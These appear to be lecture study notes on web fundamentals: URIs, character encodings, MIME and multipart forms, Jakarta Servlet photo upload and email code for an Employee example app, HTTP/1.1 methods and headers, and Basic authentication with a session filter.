  - [[#Extended ASCII|Extended ASCII]]
  - [[#Unicode and UTF-8|Unicode and UTF-8]]
- [[#MIME|MIME]]
  - [[#MIME Headers|MIME Headers]]
  - [[#Multipart Media Type|Multipart Media Type]]
  - [[#Form Encoding — multipart form-data vs x-www-form-urlencoded|Form Encoding]]
  - [[#File Upload — Jakarta Part API|File Upload — Jakarta Part API]]
  - [[#Sending Email — Jakarta Mail|Sending Email — Jakarta Mail]]
- [[#Employee Extended — Photo Upload and Email|Employee Extended — Photo Upload and Email]]
  - [[#Create Employee JSP Form|Create Employee JSP Form]]
  - [[#Employee Resource with Photo|Employee Resource with Photo]]
  - [[#parseRequest — multipart form processing|parseRequest — multipart form processing]]
  - [[#CreateEmployeeServlet — doPost|CreateEmployeeServlet — doPost]]
  - [[#sendCreationConfirmationEmail|sendCreationConfirmationEmail]]
  - [[#LoadEmployeePhotoDAO and LoadEmployeePhotoServlet|LoadEmployeePhotoDAO and LoadEmployeePhotoServlet]]
  - [[#web.xml Multipart Configuration|web.xml Multipart Configuration]]
  - [[#MailManager|MailManager]]
  - [[#Maven Dependencies — Jakarta Mail|Maven Dependencies — Jakarta Mail]]
- [[#HTTP 1.1|HTTP/1.1]]
  - [[#Overview of HTTP|Overview of HTTP]]
  - [[#HTTP Request Methods|HTTP Request Methods]]
  - [[#Properties of HTTP Methods|Properties of HTTP Methods]]
  - [[#HTTP Response Status Codes|HTTP Response Status Codes]]
  - [[#HTTP Request Headers|HTTP Request Headers]]
  - [[#HTTP Response Headers|HTTP Response Headers]]
- [[#Authentication|Authentication]]
  - [[#HTTP Basic Authentication|HTTP Basic Authentication]]
  - [[#Session-Based Authentication with ProtectedResourceFilter|Session-Based Authentication with ProtectedResourceFilter]]
- [[#Summary Table|Summary Table]]

---

## Basic Web Technology

> [!Important] Four Pillars of the Web
> | Standard | Full Name | Role |
> |----------|-----------|------|
> | **HTML** | HyperText Markup Language | Markup language to write Web pages |
> | **HTTP** | HyperText Transfer Protocol | Application-layer protocol for client-server communication |
> | **MIME** | Multipurpose Internet Mail Extensions | Media type and encoding of exchanged information |
> | **URL** | Uniform Resource Locator | Way to identify and locate resources on the Web |

---

## URL and URI

> [!Important] URI — Uniform Resource Identifier
> A **URI** is a compact sequence of characters that identifies an abstract or physical resource.
> - **Uniform**: allows different types of resource identifiers in the same context, even when access mechanisms differ
> - **Resource**: anything that can be identified — electronic document, image, concept, human being, book
> - **Identifier**: embodies the information required to distinguish what is being identified from all other things
>
> Reference: Berners-Lee, T., Fielding, R., and Masinter, L. (2005). *URI: Generic Syntax.* RFC 3986.

### URI, URL, URN, IRI

| Term | Full Name | Description | Example |
|------|-----------|-------------|---------|
| **URI** | Uniform Resource Identifier | Generic and abstract identification mechanism | — |
| **URL** | Uniform Resource Locator | URI that also provides a means to locate the resource (primary access mechanism) | `https://www.rfc-editor.org/rfc/rfc1738.txt` |
| **URN** | Uniform Resource Name | URI using the `urn:` scheme, with properties of a permanent name | `urn:isbn:978-951-0-18435-6` |
| **IRI** | Internationalized Resource Identifier | Extension of URI syntax to allow Unicode characters | `https://en.wiktionary.org/wiki/Ῥόδος` |

### URI Syntax

```
scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]
```

| Component | Description | Example |
|-----------|-------------|---------|
| `scheme` | Refers to a spec for assigning identifiers | `http`, `https`, `ftp`, `mailto`, `file` |
| `//` | Required by some schemes, not others | — |
| `user:password@` | Optional authentication section | `user:pass@` |
| `host` | Registered domain name or IP address | `www.dei.unipd.it` |
| `:port` | Optional port number | `:8080` |
| `/path` | Data in hierarchical form, segments separated by `/` | `/rest/employee/123` |
| `?query` | Optional, separated by `?`; `attribute=value` pairs separated by `&` | `?name=Rossi&age=34` |
| `#fragment` | Optional, separated by `#`; direction to a secondary resource | `#section-2` |

### URI Examples

Different schemes identify and locate resources in different ways:

| URI | Meaning |
|-----|---------|
| `ftp://ftp.is.co.za/rfc/rfc1808.txt` | File available through FTP |
| `http://www.ietf.org/rfc/rfc2396.txt` | HTTP resource |
| `mailto:John.Doe@example.com` | Email address |
| `news:comp.infosystems.www.servers.unix` | Usenet/news resource |
| `tel:+1-816-555-1212` | Telephone number |
| `telnet://192.0.2.16:80/` | Telnet access to host and port |
| `urn:oasis:names:specification:docbook:dtd:xml:4.1.2` | Persistent URN name |

### Percent-Encoding

**Percent-Encoding** encodes an octet as `%XX` where `XX` is the two-digit hex value. Used to escape:
- Reserved characters in URIs
- Non-ASCII characters

Common encodings:

| Character | Percent-Encoded |
|-----------|----------------|
| Space | `%20` |
| `?` | `%3F` |
| `&` | `%26` |
| `#` | `%23` |
| `/` | `%2F` |
| `à` | `%E0` |

> [!Example] Real-world URL with Percent-Encoding
> ```
> https://www.google.it/search?q=universit%C3%A0+di+padova&oq=universit%C3%A0+di+padova
> ```
> `%C3%A0` = UTF-8 encoding of `à` (two bytes: `0xC3 0xA0`)

---

## Character Encoding

### ASCII

> [!Important] ASCII — American Standard Code for Information Interchange
> - Introduced in 1963 by the American Standards Association (ASA)
> - Uses **7 bits** → represents **128 characters**
> - Covers: control characters, latin letters (lower/upper), digits, punctuation, symbols
> - Standardised by ISO in 1972
> - **Problem**: no coverage of non-English characters → led to national variants and incompatibilities

### Extended ASCII

- Uses **8 bits** → represents **256 characters**
- First 128 identical to 7-bit ASCII
- Upper 128 define alternative code tables for different languages → **compatibility issues**
- Standardised as **ISO 8859** sets of recommendations (since 1987)

### Unicode and UTF-8

> [!Important] Unicode
> - Developed in 1991 by the **Unicode Consortium**
> - Goal: single character set for all alphabets and symbols
> - First versions: **16 bits** → 65,536 characters
> - Modern versions: **32 bits** → up to 4,294,967,296 characters
> - First 256 characters in common with **ISO 8859-1**
> - Standardised by ISO in 1993 as **Universal Character Set (UCS)**
> - Unicode 18.0 (2026): 172,849 characters

> [!Important] UTF-8 — Unicode Transformation Format
> UTF-8 is the most adopted Unicode encoding. Memory-efficient variable-width encoding:
> - **8 bits** for characters in common with extended ASCII (ASCII range)
> - **16 bits** for characters added by first Unicode versions
> - **32 bits** for the newest characters
>
> **Intuition:** UTF-8 is backwards-compatible with ASCII for the first 128 characters — any ASCII file is a valid UTF-8 file.

The 16-bit limit (2¹⁶ = 65,536) was exceeded starting from Unicode 3.1 (2001, 94,205 chars).

---

## MIME

> [!Important] MIME — Multipurpose Internet Mail Extensions
> - Standard supporting the **encoding of information** for e-mail and the Web
> - Defines **media types** (e.g., `text`, `image`, `audio`, `application`) and **subtypes** (e.g., `plain`, `html`, `xml`)
> - Media types registered by **IANA** (Internet Assigned Numbers Authority)
> - Additional parameters possible, e.g. `charset` for text types
> - Defines headers used by SMTP (email) and HTTP (web)
>
> Reference: Freed, N. and Borenstein, N. (1996). *MIME Part One.* RFC 2045.

### MIME Headers

| Header | Purpose | Example |
|--------|---------|---------|
| `MIME-Version` | Version of MIME used | `MIME-Version: 1.0` |
| `Content-Type` | Media type + subtype + optional params | `Content-Type: text/plain; charset=ISO-8859-1` |
| `Content-Transfer-Encoding` | How binary data is encoded for transport | `Content-Transfer-Encoding: base64` |
| `Content-Disposition` | How to display/handle the content | `Content-Disposition: attachment; filename=genome.jpeg; size=9028` |

> [!Example] Binary file as base64
> ```
> Content-Type: application/octet-stream
> Content-Transfer-Encoding: base64
>
> PGh0bWw+CiAgPGhlYWQ+...
> ```

### Multipart Media Type

> [!Important] multipart — combining multiple body parts
> **`multipart`** media type: one or more body parts combined in a single body, each preceded by a **boundary delimiter line**.
>
> | Subtype | Semantics |
> |---------|-----------|
> | `multipart/mixed` | Parts are independent, bundled in order (e.g., email + attachments) |
> | `multipart/alternative` | Parts are alternative versions of the same content (e.g., plain text + HTML) |

> [!Example] multipart/mixed structure
> ```
> MIME-Version: 1.0
> Content-Type: multipart/mixed; boundary=frontier
>
> This is a message with multiple parts in MIME format.
> --frontier
> Content-Type: text/plain
>
> This is the body of the message.
> --frontier
> Content-Type: application/octet-stream
> Content-Transfer-Encoding: base64
>
> PGh0bWw+CiAgPGhlYWQ+...
> --frontier--
> ```
> Note: closing boundary has `--` suffix: `--frontier--`

### Form Encoding — multipart/form-data vs x-www-form-urlencoded

| Encoding | MIME Type | Use Case | Body Format |
|----------|-----------|----------|-------------|
| **multipart/form-data** | `multipart/form-data` | File upload + form fields | Each field/file is a separate MIME part |
| **URL-encoded** | `application/x-www-form-urlencoded` | Form fields only (no large binary) | `name=value&name2=value2` percent-encoded |

> [!Example] multipart/form-data — HTML form + HTTP body
> ```html
> <form action="http://www.xyz.com/" enctype="multipart/form-data" method="post">
>     What is your name? <input type="text" name="submit-name"/>
>     What file are you sending? <input type="file" name="files"/>
>     <input type="submit" value="Send"/>
>     <input type="reset" value="Clear"/>
> </form>
> ```
> Resulting HTTP body:
> ```
> Content-Type: multipart/form-data; boundary=AaB03x
>
> --AaB03x
> Content-Disposition: form-data; name="submit-name"
>
> Nicola
> --AaB03x
> Content-Disposition: form-data; name="files"; filename="06823700.pdf"
> Content-Type: application/pdf
>
>   ... contents of 06823700.pdf ...
> --AaB03x--
> ```

> [!Example] application/x-www-form-urlencoded
> ```html
> <form action="http://www.xyz.com/" enctype="application/x-www-form-urlencoded" method="post">
>     What is your name? <input type="text" name="submit-name"/>
>     What is your surname? <input type="text" name="submit-surname"/>
>     <input type="submit" value="Send"/>
>     <input type="reset" value="Clear"/>
> </form>
> ```
> Resulting HTTP body:
> ```
> Content-Type: application/x-www-form-urlencoded
>
> submit-name=Nicola&submit-surname=Ferro
> ```
> The same percent-encoded `name=value` string can also be appended as the query part of a URI.

### File Upload — Jakarta Part API

> [!Important] Since Servlet 5.0 — `Part` API
> `HttpServletRequest.getParts()` returns a collection of `Part` objects. Each `Part` represents either a form field or an uploaded file.
> - Max file/request size configured in `web.xml` (or via `@MultipartConfig` annotation)
> - `Part.getInputStream()` → raw bytes of the part
> - `Part.getContentType()` → MIME media type of uploaded file
> - `Part.getName()` → field name as in the HTML form
>
> Prior to Servlet 5.0: **Apache Commons FileUpload** library was used.

### Sending Email — Jakarta Mail

> [!Important] Jakarta Mail 2.1 (since Servlet 5.0)
> - Package: `jakarta.mail`
> - Replaces Apache Commons Email
> - Key classes: `Session`, `MimeMessage`, `Transport`, `MimeMultipart`, `MimeBodyPart`
> - SMTP configuration loaded from `mailManager.properties`
>
> Maven dependencies needed:
> ```xml
> <dependency>
>     <groupId>jakarta.mail</groupId>
>     <artifactId>jakarta.mail-api</artifactId>
>     <version>2.1.1</version>
> </dependency>
> <dependency>
>     <groupId>org.eclipse.angus</groupId>
>     <artifactId>angus-mail</artifactId>
>     <version>2.0.1</version>
> </dependency>
> ```

---

## Employee Extended — Photo Upload and Email

The Employee example is extended: database now stores `email`, `photo` (raw bytes), `photoMediaType`.

![[http-create-employee-form.jpg|520]]
*Figure 1: HTML form for creating an employee with email and photo upload*

![[http-employee-mail-project-structure.jpg|560]]
*Figure 2: Structure of the employee multipart mail JDBC project and Maven dependencies*

### Create Employee JSP Form

> [!Important] Multipart Form Requirements
> The JSP form must use `method="POST"` and `enctype="multipart/form-data"`; otherwise uploaded file bytes are not sent as multipart parts.
>
> ```jsp
> <form method="POST" enctype="multipart/form-data" action="<c:url value="/create-employee"/>">
>   <input id="badgeID" name="badge" type="text"/>
>   <input id="surnameID" name="surname" type="text"/>
>   <input id="ageID" name="age" type="text"/>
>   <input id="salaryID" name="salary" type="text"/>
>   <input id="emailID" name="email" type="text"/>
>   <input id="photoID" name="photo" type="file"
>          accept="image/png, image/jpeg, .jpg, .jpeg, .png"/>
>   <button type="submit">Submit</button>
>   <button type="reset">Reset the form</button>
> </form>
> ```
>
> The `accept` attribute restricts selectable file types on the client side, but the servlet must still validate the uploaded MIME type.

### Employee Resource with Photo

> [!Example] Employee class — extended with email and photo
> ```java
> public class Employee {
>     private final int badge;
>     private final String surname;
>     private final int age;
>     private final int salary;
>     private final String email;
>     private final byte[] photo;          // raw bytes of uploaded image
>     private final String photoMediaType; // "image/png" or "image/jpeg"
>
>     public final boolean hasPhoto() {
>         return photo != null && photo.length > 0
>             && photoMediaType != null && !photoMediaType.isBlank();
>     }
>
>     public final int getPhotoSize() {
>         return photo != null ? photo.length : Integer.MIN_VALUE;
>     }
> }
> ```
> **Key:** `hasPhoto()` avoids NPEs and checks all conditions. EL in JSP can call `${employee.hasPhoto()}` because latest EL versions support non-JavaBeans method invocations too.

### parseRequest — multipart form processing

> [!Example] parseRequest() — iterate over Parts
> ```java
> private Employee parseRequest(HttpServletRequest req)
>         throws ServletException, IOException, MimeTypeParseException {
>
>     int badge = -1; String surname = null; int age = -1; int salary = -1;
>     String email = null; byte[] photo = null; String photoMediaType = null;
>
>     for (Part p : req.getParts()) {
>         switch (p.getName()) {
>             case "badge":
>                 try (InputStream is = p.getInputStream()) {
>                     badge = Integer.parseInt(new String(is.readAllBytes(), StandardCharsets.UTF_8).trim());
>                 }
>                 break;
>             case "surname":
>                 try (InputStream is = p.getInputStream()) {
>                     surname = new String(is.readAllBytes(), StandardCharsets.UTF_8).trim();
>                 }
>                 break;
>             // age, salary, email — same pattern
>             case "photo":
>                 photoMediaType = p.getContentType();
>                 switch (photoMediaType.toLowerCase().trim()) {
>                     case "image/png": case "image/jpeg": case "image/jpg":
>                         break; // accepted
>                     default:
>                         throw new MimeTypeParseException(
>                             String.format("Unsupported MIME media type %s.", photoMediaType));
>                 }
>                 try (InputStream is = p.getInputStream()) {
>                     photo = is.readAllBytes();
>                 }
>                 break;
>         }
>     }
>     return new Employee(badge, surname, age, salary, email, photo, photoMediaType);
> }
> ```
> **Key points:**
> - `try-with-resources` ensures `InputStream` is always closed
> - `p.getContentType()` gives the MIME type of the uploaded file part
> - **Always validate MIME type server-side**, even if the HTML form restricts `accept`
> - `is.readAllBytes()` loads entire file into memory as `byte[]`

> [!Warning] MIME Type Validation
> Never trust the `Content-Type` reported by the client for uploaded files — it can be spoofed. Always validate `p.getContentType()` server-side before storing or processing the file.

### CreateEmployeeServlet — doPost

> [!Example] CreateEmployeeServlet.doPost() flow
> ```java
> public void doPost(HttpServletRequest req, HttpServletResponse res)
>         throws ServletException, IOException {
>     Employee e = null; Message m = null;
>     try {
>         e = parseRequest(req);
>         new CreateEmployeeDAO(getConnection(), e).access();
>         sendCreationConfirmationEmail(e);
>         m = new Message(String.format("Employee %d successfully created and confirmation email sent.", e.getBadge()));
>
>     } catch (NumberFormatException ex) {
>         m = new Message("Cannot create the employee. Invalid input parameters.", "E100", ex.getMessage());
>     } catch (SQLException ex) {
>         if ("23505".equals(ex.getSQLState())) {
>             m = new Message(String.format("Employee %d already exists.", e.getBadge()), "E300", ex.getMessage());
>         } else {
>             m = new Message("Unexpected DB error.", "E200", ex.getMessage());
>         }
>     } catch (MimeTypeParseException ex) {
>         m = new Message("Unsupported MIME media type for photo. Expected: image/png or image/jpeg.", "E400", ex.getMessage());
>     } catch (MessagingException ex) {
>         // Employee created but email failed — not a fatal error
>         m = new Message(String.format("Employee %d created but unable to send confirmation email.", e.getBadge()));
>     }
>
>     req.setAttribute("employee", e);
>     req.setAttribute("message", m);
>     req.getRequestDispatcher("/jsp/create-employee-result.jsp").forward(req, res);
> }
> ```
> **Note:** `MessagingException` is caught separately — email failure is non-fatal (employee still created in DB). The user gets a warning message instead of an error.

### sendCreationConfirmationEmail

> [!Example] sendCreationConfirmationEmail()
> ```java
> private void sendCreationConfirmationEmail(Employee e) throws MessagingException {
>     final StringBuilder sb = new StringBuilder();
>     sb.append(String.format("<p>Dear %s,</p>%n", e.getSurname()));
>     sb.append(String.format("<p>Your account has been successfully created as follows:</p>%n"));
>     sb.append(String.format("<ul>%n"));
>     sb.append(String.format("<li><b>badge</b>: %d</li>%n", e.getBadge()));
>     sb.append(String.format("<li><b>surname</b>: %s</li>%n", e.getSurname()));
>     sb.append(String.format("<li><b>age</b>: %d</li>%n", e.getAge()));
>     sb.append(String.format("<li><b>salary</b>: %d</li>%n", e.getSalary()));
>     if (e.hasPhoto()) {
>         sb.append(String.format("<li><b>profile photo</b></li>%n"));
>         sb.append(String.format("<ul>%n"));
>         sb.append(String.format("<li><b>MIME media type</b>: %s</li>%n", e.getPhotoMediaType()));
>         sb.append(String.format("<li><b>size</b>: %d byte(s)</li>%n", e.getPhotoSize()));
>         sb.append(String.format("</ul>%n"));
>     }
>     sb.append(String.format("</ul>%n"));
>     sb.append(String.format("<p>Best regards,<br>The EMPLOYEE Team</p>%n"));
>
>     MailManager.sendMail(e.getEmail(),
>         String.format("Employee %s successfully created.", e.getBadge()),
>         sb.toString(), "text/html;charset=UTF-8");
> }
> ```
> Email body is HTML; MIME type of body passed as `"text/html;charset=UTF-8"`.

### LoadEmployeePhotoDAO and LoadEmployeePhotoServlet

> [!Example] LoadEmployeePhotoDAO — SELECT photo bytes from DB
> ```java
> private static final String STATEMENT =
>     "SELECT photo, photoMediaType FROM Ferro.Employee WHERE badge = ?";
>
> @Override
> public final void doAccess() throws SQLException {
>     // ...
>     if (rs.next()) {
>         e = new Employee(Integer.MIN_VALUE, null, Integer.MIN_VALUE, Integer.MIN_VALUE,
>                          null, rs.getBytes("photo"), rs.getString("photoMediaType"));
>     } else {
>         throw new SQLException(String.format("Employee %d not found.", badge), "NOT_FOUND");
>     }
>     this.outputParam = e;
> }
> ```
> **Note:** `Employee` used as a transport object — only `photo` and `photoMediaType` are meaningful; other fields set to sentinel values.

> [!Example] LoadEmployeePhotoServlet — stream raw bytes to browser
> ```java
> e = new LoadEmployeePhotoDAO(getConnection(), badge).access().getOutputParam();
>
> if (e.hasPhoto()) {
>     res.setContentType(e.getPhotoMediaType());      // set correct MIME type
>     res.getOutputStream().write(e.getPhoto());       // stream raw bytes
>     res.getOutputStream().flush();
> } else {
>     res.setStatus(HttpServletResponse.SC_NO_CONTENT); // 204
> }
> // On errors: res.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR); // 500
> ```
> JSP `<img>` tag references this servlet:
> ```jsp
> <img src="<c:url value="/load-employee-photo">
>         <c:param name="badge" value="${employee.badge}"/>
>     </c:url>"/>
> ```

### web.xml Multipart Configuration

> [!Important] Multipart Upload Limits
> `web.xml` configures the multipart upload limits for `CreateEmployeeServlet`:
>
> ```xml
> <servlet>
>   <servlet-name>CreateEmployee</servlet-name>
>   <servlet-class>it.unipd.dei.webapp.servlet.CreateEmployeeServlet</servlet-class>
>   <multipart-config>
>     <max-file-size>1048576</max-file-size>        <!-- 1 Mbyte -->
>     <max-request-size>1049600</max-request-size>  <!-- 1 Mbyte + 1 Kbyte -->
>     <file-size-threshold>524288</file-size-threshold> <!-- 500 Kbyte -->
>   </multipart-config>
> </servlet>
> ```
>
> The same `web.xml` also declares `LoadEmployeePhotoServlet`, used by the JSP `<img>` URL to stream photo bytes back to the browser.

### MailManager

> [!Important] MailManager — static helper class for sending email
> `MailManager` uses a **static initialisation block** to load configuration once at class load time.
>
> Configuration file: `mailManager.properties` (on classpath in `resources/`).
> Properties read:
> - `MailManager.from` — sender address
> - `MailManager.smtp.host` — SMTP server hostname
> - `MailManager.smtp.port` — SMTP port (optional)
> - `MailManager.smtp.userName` — SMTP auth username
> - `MailManager.stmp.password` — SMTP auth password
>
> The static block sets `mail.transport.protocol = smtp`, enables `mail.smtp.starttls.enable = true`, disables mail debug, and creates an authenticated `Session` with `PasswordAuthentication` only when both username and password are configured.

> [!Example] MailManager.sendMail() — email without attachment
> ```java
> public static void sendMail(String to, String subject, String message, String messageMIME)
>         throws MessagingException {
>     final MimeMessage mm = new MimeMessage(session);
>     mm.setFrom();
>     mm.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
>     mm.addRecipient(Message.RecipientType.BCC, new InternetAddress(from)); // sender in BCC
>     mm.setSubject(subject);
>     mm.setContent(message, messageMIME);
>     Transport.send(mm);
> }
> ```

> [!Example] MailManager.sendAttachmentMail() — email with attachment
> ```java
> public static void sendAttachmentMail(String to, String subject, String message, String messageMIME,
>         byte[] attachment, String attachmentMIME, String attachmentFileName)
>         throws MessagingException {
>
>     final MimeMessage mm = new MimeMessage(session);
>     final Multipart multipart = new MimeMultipart();
>
>     mm.setFrom();
>     mm.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
>     mm.addRecipient(Message.RecipientType.BCC, new InternetAddress(from));
>     mm.setSubject(subject);
>
>     // body part
>     MimeBodyPart messageBodyPart = new MimeBodyPart();
>     messageBodyPart.setContent(message, messageMIME);
>     multipart.addBodyPart(messageBodyPart);
>
>     // attachment part
>     messageBodyPart = new MimeBodyPart();
>     messageBodyPart.setDataHandler(new DataHandler(new ByteArrayDataSource(attachment, attachmentMIME)));
>     messageBodyPart.setFileName(attachmentFileName);
>     multipart.addBodyPart(messageBodyPart);
>
>     mm.setContent(multipart); // multipart/mixed implicitly
>     Transport.send(mm);
> }
> ```
> The email structure is `multipart/mixed` — body text + binary attachment as separate MIME parts.

### Maven Dependencies — Jakarta Mail

![[http-employee-mail-project-structure.jpg|560]]
*Figure 3: Structure of the employee multipart mail JDBC project and Maven dependencies*

```xml
<dependency>
    <groupId>jakarta.mail</groupId>
    <artifactId>jakarta.mail-api</artifactId>
    <version>2.1.1</version>
</dependency>
<dependency>
    <groupId>org.eclipse.angus</groupId>
    <artifactId>angus-mail</artifactId>
    <version>2.0.1</version>
</dependency>
```
*(nota: `angus-mail` is the implementation; `jakarta.mail-api` is the API. Both required at runtime — no `provided` scope.)*

---

## HTTP/1.1

### Overview of HTTP

> [!Important] HTTP — HyperText Transfer Protocol
> - **Textual request-response protocol**: clients and servers exchange messages with a **header** and an optional **body**
> - **Stateless**: each request-response is independent; neither client nor server needs to track past messages
>   - Simplifies implementation; improves scalability
> - Supports **intermediaries / proxies**: typically for caching or security

![[Pasted image 20260512120450.png|440]]
*Figure 4: HTTP chain with browser, intermediate proxies, and web server*

Reference: Fielding, R. et al. (1997). *HTTP/1.1.* RFC 2068.

### HTTP Request Methods

| Method | Semantics |
|--------|-----------|
| **GET** | Retrieve information identified by the request URI |
| **POST** | Submit data to create a new subordinate resource of the URI |
| **PUT** | Store the enclosed entity under the request URI (create or replace) |
| **DELETE** | Delete the resource identified by the request URI |
| **HEAD** | Identical to GET but server must not return body; headers only |
| **OPTIONS** | Request information about communication options for the URI |
### Properties of HTTP Methods

> [!Important] Safe, Idempotent, Cacheable
> - **Safe methods**: essentially read-only; no side effects on the server. Allows spiders and pre-fetching without harm.
>   - Safe: `GET`, `HEAD`, `OPTIONS`
> - **Idempotent methods**: multiple identical requests produce the same server-side effect as one. Allows automatic retry after connection failure.
>   - Idempotent: `GET`, `HEAD`, `OPTIONS`, `DELETE`, `PUT`; **NOT** idempotent: `POST`
> - **Cacheable methods**: responses may be stored for future reuse. Generally, safe methods are cacheable.

| HTTP Method | Request Has Body | Response Has Body | Safe | Idempotent | Cacheable |
|-------------|-----------------|-------------------|------|-----------|-----------|
| `GET` | Optional | Yes | Yes | Yes | Yes |
| `HEAD` | No | No | Yes | Yes | Yes |
| `POST` | Yes | Yes | No | No | Yes |
| `PUT` | Yes | Yes | No | Yes | No |
| `DELETE` | No | Yes | No | Yes | No |
| `OPTIONS` | Optional | Yes | Yes | Yes | No |

### HTTP Response Status Codes

> [!Important] Status Code Classes
> | Class | Meaning | Example |
> |-------|---------|---------|
> | **1xx** | Informational — request received, continuing | `101 Switching Protocols` |
> | **2xx** | Success — request successfully received, understood, accepted | `200 OK`, `201 Created`, `204 No Content` |
> | **3xx** | Redirection — further action needed to complete | `301 Moved Permanently` + `Location:` header |
> | **4xx** | Client Error — bad syntax or request cannot be fulfilled | `400 Bad Request`, `401 Unauthorized`, `404 Not Found`, `405 Method Not Allowed`, `409 Conflict`, `415 Unsupported Media Type` |
> | **5xx** | Server Error — server failed to fulfill a valid request | `500 Internal Server Error` |

### HTTP Request Headers

| Header | Purpose | Example |
|--------|---------|---------|
| `Accept` | Acceptable response media types | `Accept: text/plain, image/*` |
| `Accept-Charset` | Acceptable charsets | `Accept-Charset: iso-8859-5, UTF-8` |
| `Accept-Encoding` | Acceptable content encodings | `Accept-Encoding: compress, gzip` |
| `Accept-Language` | Preferred natural languages | `Accept-Language: it, da, en-gb` |
| `Authorization` | Authentication credentials | `Authorization: Basic bmljb2xhOmZlcnJv` |
| `Content-Type` | MIME type of request body (POST/PUT) | `Content-Type: application/json` |
| `Referer` | URI from which this request was obtained | `Referer: http://example.org/page.html` |
| `User-Agent` | Information about the client | `User-Agent: CERN-LineMode/2.15 libwww/2.17b3` |

### HTTP Response Headers

| Header | Purpose | Example |
|--------|---------|---------|
| `Content-Type` | MIME type of response body | `Content-Type: text/html; charset=ISO-8859-4` |
| `Content-Encoding` | Compression applied to body | `Content-Encoding: gzip` |
| `Content-Language` | Natural language of intended audience | `Content-Language: it, en` |
| `Content-Length` | Size in bytes of body | `Content-Length: 8092` |
| `Allow` | Supported HTTP methods for the resource | `Allow: GET, HEAD, PUT` |
| `WWW-Authenticate` | Authentication challenge mechanism | `WWW-Authenticate: Basic realm="Webapp"` |
| `Server` | Software info of origin server | `Server: CERN/3.0 libwww/2.17` |
| `Date` | Date/time message originated | `Date: Tue, 15 Nov 1994 08:12:31 GMT` |
| `Last-Modified` | Date/time resource was last modified | — |
| `Location` | URI for redirect (3xx) | `Location: http://www.dei.unipd.it/` |

---

## Authentication

### HTTP Basic Authentication

> [!Important] HTTP Basic Authentication
> - Client sends credentials via the `Authorization` header
> - Username and password concatenated with `:`, then **Base64 encoded**
> - Example: `nicola:ferro` → Base64 `bmljb2xhOmZlcnJv`
> ```
> GET /secured-resource/pippo.jpg HTTP/1.1
> Authorization: Basic bmljb2xhOmZlcnJv
> ```
> **Authentication challenge** — server returns `401 Unauthorized` + `WWW-Authenticate` header:
> ```
> HTTP/1.1 401 Unauthorized
> WWW-Authenticate: Basic realm="Webapp"
> ```
> - **realm**: partitions protected resources on a server; each realm has its own authentication scheme
> - After first successful auth, browser **automatically adds** `Authorization` header to all subsequent requests under the same realm

> [!Warning] Basic Auth is NOT Encrypted
> Credentials are only Base64-**encoded**, not encrypted. Anyone intercepting the HTTP traffic can decode them trivially. Must use together with **HTTPS** to ensure confidentiality.
> **Mitigation:** Always use Basic Auth over TLS/HTTPS only.

Reference: Fielding, R. and Reschke, J. (2014). *HTTP/1.1: Authentication.* RFC 7235.

### Session-Based Authentication with ProtectedResourceFilter

The `employee-session-jdbc` project adds a **Servlet Filter** to protect resources under `/protected/*`.

![[http-session-project-structure.jpg|280]]
*Figure 5: Structure of the employee session JDBC project with filter and protected area*

![[http-session-webxml.jpg|500]]
*Figure 6: web.xml configuration for the authentication filter and protected servlets*

The protected project keeps the database resource reference in `web.xml`:

```xml
<resource-ref>
  <description>Connection pool to the database</description>
  <res-ref-name>jdbc/employee-ferro</res-ref-name>
  <res-type>javax.sql.DataSource</res-type>
  <res-auth>Container</res-auth>
</resource-ref>
```

> [!Important] Jakarta Servlet Filter
> The `Filter` interface defines three lifecycle methods: `init()`, `doFilter()`, `destroy()`.
> - `doFilter(request, response, chain)` — process the request; call `chain.doFilter(req, res)` to pass to next element
> - Can intercept before AND after the servlet/JSP
> - Configured in `web.xml` with `<filter>` + `<filter-mapping>`

![[http-filter-class-fields.jpg|560]]
*Figure 7: Main fields of the ProtectedResourceFilter class*

> [!Example] ProtectedResourceFilter — field declarations
> ```java
> public class ProtectedResourceFilter implements Filter {
>     private static final Base64.Decoder DECODER = Base64.getDecoder();
>     public static final String USER_ATTRIBUTE = "user"; // key in HttpSession
>     private FilterConfig config = null;    // from web.xml
>     private DataSource ds;                 // JNDI connection pool
> }
> ```
> - `HttpSession` is basically a hash map; `USER_ATTRIBUTE` is the key used to store the authenticated username
> - In `init()`, the filter retrieves the connection pool with `new InitialContext().lookup("java:/comp/env/jdbc/employee-ferro")` and passes it to `AuthenticateUserDAO`

![[http-filter-dofilter-code.jpg|560]]
*Figure 8: doFilter logic used to check session state and authentication*

> [!Example] doFilter() logic (text form)
> ```java
> final HttpSession session = req.getSession(false); // false = don't create if not exists
>
> if (session == null) {
>     // no session → try authentication
>     if (!authenticateUser(req, res)) return;
> } else {
>     final String user = (String) session.getAttribute(USER_ATTRIBUTE);
>     if (user == null || user.isBlank()) {
>         session.invalidate(); // stale session
>         if (!authenticateUser(req, res)) return;
>     }
>     // session + user valid → fall through to chain
> }
>
> chain.doFilter(req, res); // pass to next element
> ```

![[http-filter-authenticate-user.jpg|560]]
*Figure 9: authenticateUser logic for reading and verifying Basic credentials*

> [!Example] authenticateUser() logic
> ```java
> private boolean authenticateUser(HttpServletRequest req, HttpServletResponse res) {
>     final String auth = req.getHeader("Authorization");
>
>     if (auth == null || auth.isBlank()) {
>         sendAuthenticationChallenge(res);
>         return false;
>     }
>
>     if (!auth.toUpperCase().startsWith("BASIC ")) {
>         sendAuthenticationChallenge(res);
>         return false;
>     }
>
>     // decode Base64, split at ':' (limit=2 to handle passwords containing ':')
>     final String pair = new String(DECODER.decode(auth.substring(6)));
>     final String[] userDetails = pair.split(":", 2);
>     // userDetails[0] = username, userDetails[1] = password
>
>     // authenticate against DB via AuthenticateUserDAO
>     boolean authenticated = new AuthenticateUserDAO(con, userDetails[0], userDetails[1]).access().getOutputParam();
>
>     if (authenticated) {
>         HttpSession session = req.getSession(true); // create new session
>         session.setAttribute(USER_ATTRIBUTE, userDetails[0]);
>         return true;
>     } else {
>         sendAuthenticationChallenge(res);
>         return false;
>     }
> }
> ```

![[http-filter-send-challenge.jpg|560]]
*Figure 10: Method used to send the HTTP Basic challenge with 401 Unauthorized status*

> [!Example] sendAuthenticationChallenge()
> ```java
> private void sendAuthenticationChallenge(HttpServletResponse res) throws IOException {
>     res.setHeader("WWW-Authenticate", "Basic realm=Employee");
>     res.sendError(HttpServletResponse.SC_UNAUTHORIZED); // 401
> }
> ```

